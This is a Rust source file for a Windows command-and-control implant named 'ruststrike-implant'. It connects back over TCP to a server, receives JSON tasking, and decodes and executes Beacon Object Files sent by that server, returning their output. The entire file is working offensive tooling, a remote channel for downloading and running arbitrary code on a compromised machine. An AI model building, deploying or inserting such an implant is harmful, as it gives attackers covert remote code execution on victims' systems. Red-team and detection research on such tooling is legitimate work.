//! ruststrike-implant: Windows implant. Connects back to the server over TCP,
//! dispatches `hello` and `bof` messages, and returns output/error.
//!
//! Build target: x86_64-pc-windows-gnu.

use anyhow::{Context, Result};
use ruststrike_loader::run_bof;
use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
use std::io::{BufRead, BufReader, BufWriter, Write};
use std::net::TcpStream;

fn main() -> Result<()> {
    // Args: implant <host> [port]; defaults 127.0.0.1 4444.
    let args: Vec<String> = std::env::args().collect();
    let host = args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".to_string());
    let port: u16 = args.get(2).and_then(|s| s.parse().ok()).unwrap_or(4444);
    let addr = format!("{host}:{port}");

    let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
    eprintln!("[implant] connected to {addr}");

    let read_stream = stream.try_clone().context("cloning stream")?;
    let writer = BufWriter::new(stream);

    let (tx, rx) = std::sync::mpsc::channel::<ImplantMessage>();
    let send_tx = tx.clone();

    // Reader thread: server -> dispatch.
    std::thread::spawn(move || reader_loop(read_stream, send_tx));

    // Main thread only receives; drop our sender so the channel closes when the
    // reader thread exits.
    drop(tx);

    let mut writer = writer;
    // Sender: drain outbound messages from the channel.
    for msg in rx.iter() {
        if send(&mut writer, &msg).is_err() {
            eprintln!("[implant] connection lost");
            break;
        }
    }
    eprintln!("[implant] exiting");
    Ok(())
}

fn reader_loop(stream: TcpStream, tx: std::sync::mpsc::Sender<ImplantMessage>) {
    let mut reader = BufReader::new(stream);
    let mut line = String::new();
    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => {
                eprintln!("[implant] server closed connection");
                break;
            }
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let msg = match serde_json::from_str::<ServerMessage>(trimmed) {
                    Ok(m) => m,
                    Err(e) => {
                        let _ = tx.send(ImplantMessage::Error {
                            data: format!("bad server message ({e})"),
                        });
                        continue;
                    }
                };
                let reply = handle(msg);
                if tx.send(reply).is_err() {
                    break;
                }
            }
            Err(e) => {
                eprintln!("[implant] read error: {e}");
                break;
            }
        }
    }
}

fn handle(msg: ServerMessage) -> ImplantMessage {
    match msg {
        ServerMessage::Hello => ImplantMessage::Hello {
            data: "hello from implant".to_string(),
        },
        ServerMessage::Bof { file, args } => match decode_bof(&file) {
            Err(e) => ImplantMessage::Error {
                data: format!("decode bof: {e}"),
            },
            Ok(bytes) => match run_bof(&bytes, &args) {
                Ok(output) => ImplantMessage::Output { data: output },
                Err(e) => ImplantMessage::Error {
                    data: format!("run_bof: {e:#}"),
                },
            },
        },
    }
}

fn send(writer: &mut BufWriter<TcpStream>, msg: &ImplantMessage) -> Result<()> {
    writer.write_all(msg.to_json().as_bytes())?;
    writer.write_all(b"\n")?;
    writer.flush()?;
    Ok(())
}
